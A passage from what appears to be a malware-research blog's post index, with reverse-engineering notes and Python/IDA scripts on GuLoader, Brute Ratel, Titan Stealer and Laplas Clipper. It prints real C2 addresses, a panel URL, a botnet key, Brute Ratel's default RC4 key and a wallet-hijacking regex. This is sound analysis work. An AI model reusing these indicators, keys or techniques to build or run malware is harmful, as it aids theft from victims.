FlowChart(f, flags=FC_PREDS) for block in fc: print(f&quot;Basic Block: {hex(block.start_ea)}&quot;) print(&quot;&quot;) # grab the last two instructions in the block last_inst = idc.prev_head(block.end_ea) penultimate_inst = idc.prev_head(last_inst) ea = block.start_ea while ea &lt; block.end_ea: dLine = idc.generate_disasm_line(ea, 1) print(f&quot;{hex(ea)}: &quot; + dLine) ea = idc.next_head(ea) def get_string_fn(ptr_addr): out = None limt_count = 0 while limt_count &lt; 10000: ptr_addr = idc.prev_head(ptr_addr) if is_code(ida_bytes.get_full_flags(ptr_addr)): if idc.print_insn_mnem(ptr_addr) == &#39;call&#39;: print(idc.get_operand_value(ptr_addr, 0)) out = idc.get_operand_value(ptr_addr, 0) break limt_count += 1 return out def get_xref_list(fn_addr): return [addr.frm for addr in idautils.XrefsTo(fn_addr)] xref_list = get_xref_list(0x025A28) str_fn_list = [] for xref in xref_list: str_fn = get_string_fn(xref) if str_fn is not None: str_fn_list.append(str_fn) . str_fn_list = [0x254d4, 0x1644a, 0x147f1, 0x1607f, 0x1d6a4, 0x1be3d, 0x1babc, 0x1836d, 0x8a55, 0x8d44, 0x670f, 0x4270, 0xac35, 0xaab1, 0x8f89, 0x9d9c, 0x1d9d3, 0x14d18, 0x18aa1, 0x19765, 0x1a31c, 0x1ae60, 0x17571, 0x18f33, 0x192f4, 0x17de0, 0x15b41, 0x14d35, 0x167d4, 0x171af, 0x16e4f, 0x1cf67, 0x1c943, 0x17aa1] for str_fn in str_fn_list: try: print(decrypt(str_fn)) except: pass . user32 psapi.dll Msi.dll Publisher Skattekister138 OverOps146.70.147.12/vSFjv98.fla SOFTWARE AppDataLow Tumorlike ProgramFiles= windir= system32 syswow64 iertutil.dll wininet.dll KERNELBASE.DLL shell32 advapi32 C: Program Files Qemu-ga qemu-ga.exe C: Program Files qga qga.exe TEMP= .",
            "url": "https://research.openanalysis.net/guloader/unicorn/emulation/anti-debug/debugging/config/2022/12/16/guloader.html",
            "relUrl": "/guloader/unicorn/emulation/anti-debug/debugging/config/2022/12/16/guloader.html",
            "date": " ‚Ä¢ Dec 16, 2022"
        }
        
    
  
    
        ,"post25": {
            "title": "Brute Ratel",
            "content": "Collab with @BoymoderRE . This is part of an ongoing collaboration with BoymoderRE she has been streaming her work over on her twitch channel, and we have been sharing IDBs using the free open source IDA collaboration tool IDArling. . Overview . Brute Ratel is a pentesting framework what was recently leaked and has been showing up in the hands of ransomware operators. We are going to focus on the releases before 1.3 where many of the weaknesses in the implant were fixed. To date we have only seen the older versions used by ransomware operators. . Some of the weaknesses in the older version. . Default Rc4 key used bYXJm/3#M?:XyMBF | Using ror13 string hashes | Strings in the badger&#39;s memory | Config is base64 encoded in stage 1 | . Sample . The sample we are analyzing in not public. . References . When Pentest Tools Go Brutal: Red-Teaming Tool Being Abused by Malicious Actors | Black Basta Ransomware Gang Infiltrates Networks via QAKBOT, Brute Ratel, and Cobalt Strike | Brute Ratel Config Decoding update | Immersive-Labs-Sec/BruteRatel-DetectionTools (github) | Brute Ratel release notes | Blobrunner shellcode debugging tool | . Analysis . Our sample comes as a 64-bit shellcode blob, the first order of business is to unpack it! . b64_data = bytes.fromhex(&#39;42 53 4B 50 36 52 5A 38 61 66 62 4F 6E 48 47 38 4E 54 76 50 66 6B 59 42 51 35 67 42 42 67 67 68 43 6B 71 6E 2F 43 35 51 62 68 72 55 51 53 39 75 4B 4C 4C 37 33 57 50 31 4A 68 46 77 51 66 35 6E 55 39 38 50 4E 53 70 36 70 6D 2B 69 55 55 63 46 70 64 45 4C 58 79 38 79 64 6A 67 71 49 4C 4C 78 61 6F 55 4A 57 33 49 6D 49 6C 48 74 64 31 48 34 51 70 4F 37 6E 2B 56 4D 62 56 45 77 36 77 75 32 47 7A 68 6B 4B 68 51 77 72 4B 31 32 51 35 4F 78 61 6F 6A 57 31 30 2F 42 70 39 31 72 77 68 49 4B 4C 37 4E 51 73 62 38 75 57 66 34 46 62 52 42 69 70 6D 73 37 33 37 65 4E 41 71 47 4E 51 58 78 44 34 59 41 6E 51 41 65 68 47 71 49 47 39 6A 4A 36 2B 7A 4F 78 34 6F 6A 63 30 70 77 57 70 42 48 53 79 63 37 2F 57 73 46 53 46 69 77 37 36 43 53 6C 6D 38 43 43 6E 4D 45 6F 54 56 30 56 41 57 6E 6A 41 4F 31 33 75 72 79 43 6C 77 4E 38 77 4C 2F 73 63 45 62 5A 37 30 73 77 67 67 73 54 45 42 32 34 64 73 6B 78 6A 6F 41 55 55 6C 7A 70 6E 6F 31 5A 6F 57 57 4B 5A 67 4E 6E 7A 72 65 67 64 41 4E 2B 6B 49 53 71 31 4F 2F 48 43 44 70 47 62 54 42 42 43 67 58 34 36 48 34 4A 38 47 4F 59 42 70 43 55 53 66 66 56 58 6A 68 53 49 31 32 65 55 55 65 48 41 37 79 57 38 63 46 5A 00&#39;.replace(&#39; &#39;,&#39;&#39;)) b64_data . b&#39;BSKP6RZ8afbOnHG8NTvPfkYBQ5gBBgghCkqn/C5QbhrUQS9uKLL73WP1JhFwQf5nU98PNSp6pm+iUUcFpdELXy8ydjgqILLxaoUJW3ImIlHtd1H4QpO7n+VMbVEw6wu2GzhkKhQwrK12Q5OxaojW10/Bp91rwhIKL7NQsb8uWf4FbRBipms737eNAqGNQXxD4YAnQAehGqIG9jJ6+zOx4ojc0pwWpBHSyc7/WsFSFiw76CSlm8CCnMEoTV0VAWnjAO13uryClwN8wL/scEbZ70swggsTEB24dskxjoAUUlzpno1ZoWWKZgNnzregdAN+kISq1O/HCDpGbTBBCgX46H4J8GOYBpCUSffVXjhSI12eUUeHA7yW8cFZ x00&#39; . Stage 1 Unpacker . The shellcode payload contains an RC4 encrypted PE with the &quot;badger&quot; payload. The RC4 key is 8 bytes which is appended directly to the end of the encrypted payload. . | This encrypted blob is moved on the the stack in blocks of 8 bytes. The stack blob and size are then copied on the heap. . | The same approach is used for the (config?) but this is base64 encoded. . | The heap allocations containing the encrypted payload, the base64 encoded config, and the lenght of both data allocations are passed to the initialization function in the shellcode. . | . def rc4crypt(data, key): #If the input is a string convert to byte arrays if type(data) == str: data = data.encode(&#39;utf-8&#39;) if type(key) == str: key = key.encode(&#39;utf-8&#39;) x = 0 box = list(range(256)) for i in range(256): x = (x + box[i] + key[i % len(key)]) % 256 box[i], box[x] = box[x], box[i] x = 0 y = 0 out = [] for c in data: x = (x + 1) % 256 y = (y + box[x]) % 256 box[x], box[y] = box[y], box[x] out.append(c ^ box[(box[x] + box[y]) % 256]) return bytes(out) . payload_enc = open(&#39;/tmp/brute_enc_shellcode.bin&#39;,&#39;rb&#39;).read() . payload_key = payload_enc[-8:] out = rc4crypt(payload_enc[:-8],payload_key) out[:0x400] . b&#39; x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x80 x00 x00 x00 x0e x1f xba x0e x00 xb4 t xcd! xb8 x01L xcd x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 r r n$ x00 x00 x00 x00 x00 x00 x00PE x00 x00d x86 t x00 xd9 xb4 x03c x00 x00 x00 x00 x00 x00 x00 x00 xf0 x00.&#34; x0b x02 x02&#34; x00 xb4 x02 x00 x00 xdc x00 x00 x00 x1e x00 x00 x00 x10 x00 x00 x00 x10 x00 x00 x00 x00 x00 x10 x00 x00 x00 x00 x00 x10 x00 x00 x00 x02 x00 x00 x04 x00 x00 x00 x00 x00 x00 x00 x05 x00 x02 x00 x00 x00 x00 x00 x00 x10 x04 x00 x00 x04 x00 x00 xf0 xd3 x03 x00 x03 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x10 x00 x00 x00 x00 x00 x00 x00 x00 x10 x00 x00 x00 x00 x00 x00 x10 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x10 x00 x00 x00 x00 xe0 x03 x006 x00 x00 x00 x00 xf0 x03 x00 x80 x04 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x80 x03 x00 x8c x13 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x04 x00l x04 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00L xf1 x03 x00 x10 x01 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00.text x00 x00 x00 xb0 xb3 x02 x00 x00 x10 x00 x00 x00 xb4 x02 x00 x00 x04 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00P`.data x00 x00 x000 x1b x00 x00 x00 xd0 x02 x00 x00 x1c x00 x00 x00 xb8 x02 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00@ x00` xc0.rdata x00 x00P x83 x00 x00 x00 xf0 x02 x00 x00 x84 x00 x00 x00 xd4 x02 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00@ x00`@.pdata x00 x00 x8c x13 x00 x00 x00 x80 x03 x00 x00 x14 x00 x00 x00X x03 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00@ x000@.xdata x00 x00h x18 x00 x00 x00 xa0 x03 x00 x00 x1a x00 x00 x00l x03 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00@ x000@.bss x00 x00 x00 x00 xa6 x1d x00 x00 x00 xc0 x03 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x80 x00` xc0.edata x00 x006 x00 x00 x00 x00 xe0 x03 x00 x00 x02 x00 x00 x00 x86 x03 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00@ x000@.idata x00 x00 x80 x04 x00 x00 x00 xf0 x03 x00 x00 x06 x00 x00 x00 x88 x03 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00@ x000 xc0.reloc x00 x00l x04 x00 x00 x00 x00 x04 x00 x00 x06 x00 x00 x00 x8e x03 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00@ x000B x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00&#39; . stage1_data = open(&#39;/tmp/stage1.bin&#39;,&#39;rb&#39;).read() . from ctypes import * import unicorn as uc stage1_data = open(&#39;/tmp/stage1.bin&#39;,&#39;rb&#39;).read() call_state = 0 def hook_call(uc_engine, mem_type, address, size): global call_state ptr_data = uc_engine.reg_read(uc.x86_const.UC_X86_REG_RCX) data_size = uc_engine.reg_read(uc.x86_const.UC_X86_REG_RDX) print(f&quot;Hook: blob ptr: {hex(ptr_data)} size:{hex(data_size)}&quot;) buf = uc_engine.mem_read(ptr_data, data_size) if call_state == 0: print(&quot;Found first blob&quot;) print(buf[:100]) name = &quot;first.bin&quot; else: print(&quot;Found second blob&quot;) print(buf[:100]) name = &quot;second.bin&quot; call_state += 1 rip = uc_engine.reg_read(uc.x86_const.UC_X86_REG_RIP) print(f&quot;RIP: {hex(rip)}&quot;) rip += 5 uc_engine.reg_write(uc.x86_const.UC_X86_REG_RIP, rip) open(f&#39;/tmp/{name}&#39;, &#39;wb&#39;).write(buf) if call_state == 2: print(&quot;End emulation&quot;) uc_engine.reg_write(uc.x86_const.UC_X86_REG_RIP, 0x99999999999) return True def main(buf): uc_engine = uc.Uc(uc.UC_ARCH_X86, uc.UC_MODE_64) STACK_ADDR = 0x4400000 CODE_ADDR = 0x1400000 uc_engine.mem_map(CODE_ADDR, 0x100000, uc.UC_PROT_ALL) uc_engine.mem_map(STACK_ADDR - 0x100000, 0x200000, uc.UC_PROT_ALL) uc_engine.mem_write(CODE_ADDR, buf) uc_engine.reg_write(uc.x86_const.UC_X86_REG_RIP, CODE_ADDR) uc_engine.reg_write(uc.x86_const.UC_X86_REG_RSP, STACK_ADDR) hook1 = uc_engine.hook_add(uc.UC_HOOK_CODE, hook_call, None, CODE_ADDR + 0x0536B1, CODE_ADDR + 0x0536B2) hook2 = uc_engine.hook_add(uc.UC_HOOK_CODE, hook_call, None, CODE_ADDR + 0x536CB, CODE_ADDR + 0x536CC) uc_engine.emu_start(CODE_ADDR, CODE_ADDR + 0x10000, 0, 0) out_rip = uc_engine.reg_read(uc.x86_const.UC_X86_REG_RIP) main(stage1_data) . Hook: blob ptr: 0x43c69f0 size:0x39410 Found first blob bytearray(b&#39;; xbc xca x9f xfa x95aX, xb4 xdc x98 xfb x87 x13&#34; x88x x05 xff2 xc4 xcc xbd xdc, xb6 xa5$. xe5 xe4 xf2r xec xea]/ xec6 xae xc3 xd9 xc4 x91@A x14 xf8 xbd xa4t x95 xb6 xa6[ xb6 x9a~ xaf&lt; xf7 xc598 x0b xd2 xa9 x8df xaf xa4 x00 xeb xcc xa4w xb0 xa8i#u x0b xf0 xec x89 xde xf6 xe7e x8a xca x06m x1dl# x9f xd4a&#39;) RIP: 0x14536b1 Hook: blob ptr: 0x43ffe00 size:0x178 Found second blob bytearray(b&#39;BSKP6RZ8afbOnHG8NTvPfkYBQ5gBBgghCkqn/C5QbhrUQS9uKLL73WP1JhFwQf5nU98PNSp6pm+iUUcFpdELXy8ydjgqILLxaoUJ&#39;) RIP: 0x14536cb End emulation . UcError Traceback (most recent call last) &lt;ipython-input-7-7940ea9dc380&gt; in &lt;module&gt; 45 out_rip = uc_engine.reg_read(uc.x86_const.UC_X86_REG_RIP) 46 &gt; 47 main(stage1_data) &lt;ipython-input-7-7940ea9dc380&gt; in main(buf) 42 hook1 = uc_engine.hook_add(uc.UC_HOOK_CODE, hook_call, None, CODE_ADDR + 0x0536B1, CODE_ADDR + 0x0536B2) 43 hook2 = uc_engine.hook_add(uc.UC_HOOK_CODE, hook_call, None, CODE_ADDR + 0x536CB, CODE_ADDR + 0x536CC) &gt; 44 uc_engine.emu_start(CODE_ADDR, CODE_ADDR + 0x10000, 0, 0) 45 out_rip = uc_engine.reg_read(uc.x86_const.UC_X86_REG_RIP) 46 ~/.pyenv/versions/3.9.5/lib/python3.9/site-packages/unicorn/unicorn.py in emu_start(self, begin, until, timeout, count) 339 status = _uc.uc_emu_start(self._uch, begin, until, timeout, count) 340 if status != uc.UC_ERR_OK: --&gt; 341 raise UcError(status) 342 343 if self._hook_exception is not None: UcError: Invalid memory fetch (UC_ERR_FETCH_UNMAPPED) . from ctypes import * import unicorn as uc stage1_data = open(&#39;/tmp/stage1.bin&#39;,&#39;rb&#39;).read() call_state = 0 def hook_call(uc_engine, mem_type, address, size): global call_state rip = uc_engine.reg_read(uc.x86_const.UC_X86_REG_RIP) rip_byte = uc_engine.mem_read(rip, 1) if rip_byte == b&#39; xe8&#39;: print(f&quot;Call hook at RIP: {hex(rip)}&quot;) if call_state == 0: call_state += 1 return True ptr_data = uc_engine.reg_read(uc.x86_const.UC_X86_REG_RCX) data_size = uc_engine.reg_read(uc.x86_const.UC_X86_REG_RDX) print(f&quot;Hook: blob ptr: {hex(ptr_data)} size:{hex(data_size)}&quot;) buf = uc_engine.mem_read(ptr_data, data_size) if call_state == 1: print(&quot;Found first blob&quot;) print(buf[:100]) name = &quot;first.bin&quot; else: print(&quot;Found second blob&quot;) print(buf[:100]) name = &quot;second.bin&quot; call_state += 1 rip += 5 uc_engine.reg_write(uc.x86_const.UC_X86_REG_RIP, rip) open(f&#39;/tmp/{name}&#39;, &#39;wb&#39;).write(buf) if call_state == 3: print(&quot;End emulation&quot;) uc_engine.reg_write(uc.x86_const.UC_X86_REG_RIP, 0x99999999999) return True def main(buf): uc_engine = uc.Uc(uc.UC_ARCH_X86, uc.UC_MODE_64) STACK_ADDR = 0x4400000 CODE_ADDR = 0x1400000 uc_engine.mem_map(CODE_ADDR, 0x100000, uc.UC_PROT_ALL) uc_engine.mem_map(STACK_ADDR - 0x100000, 0x200000, uc.UC_PROT_ALL) uc_engine.mem_write(CODE_ADDR, buf) uc_engine.reg_write(uc.x86_const.UC_X86_REG_RIP, CODE_ADDR) uc_engine.reg_write(uc.x86_const.UC_X86_REG_RSP, STACK_ADDR) hook1 = uc_engine.hook_add(uc.UC_HOOK_CODE, hook_call, None) uc_engine.emu_start(CODE_ADDR, CODE_ADDR + 0x10000, 0, 0) out_rip = uc_engine.reg_read(uc.x86_const.UC_X86_REG_RIP) main(stage1_data) . Call hook at RIP: 0x1400000 Call hook at RIP: 0x14536b1 Hook: blob ptr: 0x43c69f0 size:0x39410 Found first blob bytearray(b&#39;; xbc xca x9f xfa x95aX, xb4 xdc x98 xfb x87 x13&#34; x88x x05 xff2 xc4 xcc xbd xdc, xb6 xa5$. xe5 xe4 xf2r xec xea]/ xec6 xae xc3 xd9 xc4 x91@A x14 xf8 xbd xa4t x95 xb6 xa6[ xb6 x9a~ xaf&lt; xf7 xc598 x0b xd2 xa9 x8df xaf xa4 x00 xeb xcc xa4w xb0 xa8i#u x0b xf0 xec x89 xde xf6 xe7e x8a xca x06m x1dl# x9f xd4a&#39;) Call hook at RIP: 0x14536cb Hook: blob ptr: 0x43ffe00 size:0x178 Found second blob bytearray(b&#39;BSKP6RZ8afbOnHG8NTvPfkYBQ5gBBgghCkqn/C5QbhrUQS9uKLL73WP1JhFwQf5nU98PNSp6pm+iUUcFpdELXy8ydjgqILLxaoUJ&#39;) End emulation . UcError Traceback (most recent call last) &lt;ipython-input-2-47735b0fbcb1&gt; in &lt;module&gt; 49 out_rip = uc_engine.reg_read(uc.x86_const.UC_X86_REG_RIP) 50 &gt; 51 main(stage1_data) &lt;ipython-input-2-47735b0fbcb1&gt; in main(buf) 46 uc_engine.reg_write(uc.x86_const.UC_X86_REG_RSP, STACK_ADDR) 47 hook1 = uc_engine.hook_add(uc.UC_HOOK_CODE, hook_call, None) &gt; 48 uc_engine.emu_start(CODE_ADDR, CODE_ADDR + 0x10000, 0, 0) 49 out_rip = uc_engine.reg_read(uc.x86_const.UC_X86_REG_RIP) 50 ~/.pyenv/versions/3.9.5/lib/python3.9/site-packages/unicorn/unicorn.py in emu_start(self, begin, until, timeout, count) 339 status = _uc.uc_emu_start(self._uch, begin, until, timeout, count) 340 if status != uc.UC_ERR_OK: --&gt; 341 raise UcError(status) 342 343 if self._hook_exception is not None: UcError: Invalid memory fetch (UC_ERR_FETCH_UNMAPPED) .",
            "url": "https://research.openanalysis.net/rat/brute%20ratel/redteam/python/research/boymoderre/2022/12/11/brute-ratel.html",
            "relUrl": "/rat/brute%20ratel/redteam/python/research/boymoderre/2022/12/11/brute-ratel.html",
            "date": " ‚Ä¢ Dec 11, 2022"
        }
        
    
  
    
        ,"post26": {
            "title": "Titan Stealer",
            "content": "Overview . According to @ViriBack . The ref md5 :82040e02a2c16b12957659e1356a5e19 (a7dfb6bb7ca1c8271570ddcf81bb921cf4f222e6e190e5f420d4e1eda0a0c1f2) for rule 2039778 communicates to same host:port that is mentioned in this blog for Titan panelcallout pattern: /sendlog with a base64 zip . The attribution on this comes from the link to the Titan Stealer panel at http[:]//77.73.133[.]88:5000/login/ . . Sample . A7DFB6BB7CA1C8271570DDCF81BB921CF4F222E6E190E5F420D4E1EDA0A0C1F2 malware bazaar . References . @ViriBack analysis of titan stealer | Titan Stealer Panels | . Analysis . C2 . Lol this is in plaintext! . 8D 05 4C B1 50 00 lea eax, a777313388 ; &quot;77.73.133.88&quot; 89 44 24 04 mov [esp+0A0h+a2], eax C7 44 24 08 0C 00 00 00 mov [esp+0A0h+a3], 0Ch C7 44 24 0C 88 13 00 00 mov [esp+0A0h+a4], 5000 . import re file_data = open(&#39;/tmp/titan.bin&#39;,&#39;rb&#39;).read() for m in re.finditer(rb&quot;(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?) .){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;, file_data): print(m.group()) . b&#39;77.73.133.88&#39; . GO String Extraction . We can follow the example from JAGS&#39; AlphaGOLang script and just identify where the strings are loaded in the code. . Dynamically Allocated Strings . These are loaded inline in assembly. Usually there is a string ref followed by the string size. . get the virtual address bounds of the .rdata section to validate string refs | create a list of asm blocks used to dynamically load strings | scan for these and filter the fps using our rdata block | check if the string is valid | . import re import pefile file_data = open(&#39;/tmp/titan.bin&#39;,&#39;rb&#39;).read() pe = pefile.PE(data=file_data) # Rebase PE to 0 and conver addresses into RVAs # Based! pe.relocate_image(0) rdata_start = None rdata_end = None for s in pe.sections: if s.Name.startswith(b&#39;.rdata&#39;): rdata_start = s.VirtualAddress rdata_end = rdata_start + s.Misc_VirtualSize assert rdata_start is not None text_data = None for s in pe.sections: if s.Name.startswith(b&#39;.text&#39;): text_data = s.get_data() assert text_data is not None . Build our regexes . import struct def is_ascii(s): return all(c &lt; 128 or c == 0 for c in s) def get_ip(s): m = re.match(&quot;^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?) .){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$&quot;, s) if m: return m.group() return None # 8D 05 4C B1 50 00 lea eax, a777313388 ; &quot;77.73.133.88&quot; # 89 44 24 04 mov [esp+0A0h+a2], eax # C7 44 24 08 0C 00 00 00 mov [esp+0A0h+a3], 0Ch egg_1 = rb&#39; x8D.(....) x89... xC7...(....)&#39; strings = [] c2_ip = None c2_port = None for m in re.finditer(egg_1, text_data): str_rva = struct.unpack(&#39;&lt;I&#39;, m.group(1))[0] str_len = struct.unpack(&#39;&lt;I&#39;, m.group(2))[0] if str_rva &lt; rdata_start or str_rva &gt; rdata_end: continue if str_len &lt; 2 or str_len &gt; 100: continue tmp_str = pe.get_data(str_rva, str_len) if is_ascii(tmp_str): strings.append(tmp_str.decode(&#39;utf-8&#39;)) ip = get_ip(tmp_str.decode(&#39;utf-8&#39;)) if ip is not None: c2_ip = ip c2_port = struct.unpack(&#39;&lt;I&#39;, text_data[m.end()+4: m.end() + 4 + 4])[0] print(c2_ip) print(c2_port) . 77.73.133.88 5000 . for s in strings: m = re.match(&quot;^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?) .){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$&quot;, s) if m: print(m.group()) . 77.73.133.88 . Static Strings . These are located in the .data section as a struct with the following shape. . struct go_string{ char* str_buff; size_t str_len; }; . get the virtual address bounds of the .rdata section to validate string refs | scan the .data section for the above structure (this will be gross) | for each potential struct found validate the strings | .",
            "url": "https://research.openanalysis.net/golang/titan/stealer/python/research/ida/goresym/alphagolang/2022/12/01/titan_stealer.html",
            "relUrl": "/golang/titan/stealer/python/research/ida/goresym/alphagolang/2022/12/01/titan_stealer.html",
            "date": " ‚Ä¢ Dec 1, 2022"
        }
        
    
  
    
        ,"post27": {
            "title": "Laplace Clipper",
            "content": "Overview . According to cyble laplas is a clipboard hijacker that is sold openly on forums. This sample of Laplas is written in GOLang, but there is also a .NET build. . According to the same blog the malware calls out to its C2 to get a list of regexes to use for clipboard hijacking. . The malware uses GetRegex() function to get all the regex patterns from the C&amp;C server. This function calls SendRequest() function internally, which forms the below URL that downloads the regex pattern to identify the victim‚Äôs cryptocurrency wallet address. hxxp[:]//clipper[.]guru/bot/regex?key=afc950a4a18fd71c9d7be4c460e4cb77d0bcf29a49d097e4e739c17c332c3a34 . Panel . This stealer has poor OPSEC and the panel is openly available on the web at https://laplas[.]app/. Potential users are encouraged to create an account and purchase access to the bot. . . The developer also has a telegram channel at https://t[.]me/LAPLAS_CLIPPER_NEWS. . . Samples . Packed: 81e9eefec051e50a819e76fa1ec2f088c2e8c5de677537838193cf6c2e5c7584 malware bazaar Unpacked:f341ad891d445c745f10b4861a5c273abf7a38a0bd85168e7e6528e6b5c0141d malshare . References . JoeSandbox extracted c2 http://clipper.guru/bot/online link | cyble blog describing laplas | AlphaGolang IDA plugin | GoReSym | . Analysis . GO Analysis Workflow . We are only using IDA 7.5 so we don&#39;t have a lot of the fancy GO features in the newer versions of IDA. We are mainly relying on IDA plugins to fix up the GO binary. . Run AlphaGolang scripts (1) and (2) to label the statically linked GO runtime and library code | Run GoReSym and imported the results with their IDA script (not sure what this did?) | Run AlphaGolang script (4) to fix up the string refs ... this only sort of works | Optional mark the .data section with the string references as readble only (constant) to force Hex-Rays to show the string literals... we also need to uncheck the Print only constant string literals in the Hex-Rays options. This will now show the string refs. ref | Strings are not null terminated this means that we need to force the string size manually or IDA will assume a giant blob of ascii text is the string. There should be a better way but for now we just made a terrible one-off script. | GO String Formatting . Go strings use the following struct. . struct go_string{ char* string_buff; DWORD string_len; } . The following terrible script can be used to manually force the proper string length for the GO strings references in the .data section. The start and end are used to mark the start and end of the GO strings table (barf heuristic to check if it&#39;s a legit string or not). This should probably be replaced and integrated into the GO scipts above. . def make_string(ptr): start = 0x0069E954 end = 0x006B34FC str_len = ida_bytes.get_32bit(ptr+4) str_ptr = ida_bytes.get_32bit(ptr) if start &lt;= str_ptr &lt; end: ida_bytes.create_strlit(str_ptr, str_len, STRTYPE_C) for ptr in range(0x0087B804, 0x087CC4F, 4): make_string(ptr) . GO Calling Convention and IDA 7.5 . There is no good way for IDA 7.5 to handle multiple return values (used by GO) in the Hex-Rays decompiler. Though later versions of IDA support a custom __usercall notation to handle this. . Igor‚Äôs tip of the week #107: Multiple return values | Stack-based return values in down&#39;t work in IDA 7.5 | . Laplas String . import base64 data = &#39;FxgdBAQRBloTAQYB&#39; data_enc = base64.b64decode(data) out = [] key = 0x74 for c in data_enc: out.append(c ^ key) bytes(out) . b&#39;clipper.guru&#39; . def decrypt(data, key): data_enc = base64.b64decode(data) out = [] for c in data_enc: out.append(c ^ key) return bytes(out) print(decrypt(&#39;FRcRQE1GEU1CQkVGRkdAQE1DTEYSFxdMRE1CEBdCERJCRkxNREdGEERMEERHFUMWRBVNRkVDTUJGRhdHQRYQFg==&#39;,key)) print(decrypt(&#39;FxgdBAQRBloTAQYB&#39;,key)) print(decrypt(&#39;Hh0XIDI2FQIHGQ==&#39;,key)) print(decrypt(&#39;ByY5HxE2BhgsMFoEHRA=&#39;,key)) print(decrypt(&#39;JDoXDho4Az05GFoRDBE=&#39;,key)) . b&#39;ace492e9661223449782fcc8096dc6ef6289032d08d03a7b0a92179622c35bdb&#39; b&#39;clipper.guru&#39; b&#39;jicTFBavsm&#39; b&#39;sRMkeBrlXD.pid&#39; b&#39;PNcznLwIMl.exe&#39; . The first string is the KEY that is used to ID the botnet operator and the second is the the C2 host (the botnet is centrally hosted so encryptiing this seems silly). . C2 URLs . Regex . The regex endpoint is used to pull down a list of regexes used to replace clipboard data. . http[:]//clipper[.]guru/bot/regex?key=ace492e9661223449782fcc8096dc6ef6289032d08d03a7b0a92179622c35bdb . Response . ^(?:(1[1-9A-HJ-NP-Za-km-z]{33})|(3[1-9A-HJ-NP-Za-km-z]{33})|(bc1q[023456789acdefghjklmnpqrstuvwxyz]{38,58})|(q[a-z0-9]{41})|(p[a-z0-9]{41})|(L[a-km-zA-HJ-NP-Z1-9]{33})|(M[a-km-zA-HJ-NP-Z1-9]{33})|(ltc1q[a-km-zA-HJ-NP-Z1-9]{38})|(0x[a-fA-F0-9]{40})|(D[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32})|(4[0-9AB][1-9A-HJ-NP-Za-km-z]{93})|(8[0-9AB][1-9A-HJ-NP-Za-km-z]{93})|(r[0-9a-zA-Z]{33})|(t1[a-km-zA-HJ-NP-Z1-9]{33})|(X[1-9A-HJ-NP-Za-km-z]{33})|(ronin:[a-fA-F0-9]{40})|(T[A-Za-z1-9]{33})|(http[s]*: / /steamcommunity.com /tradeoffer /new / 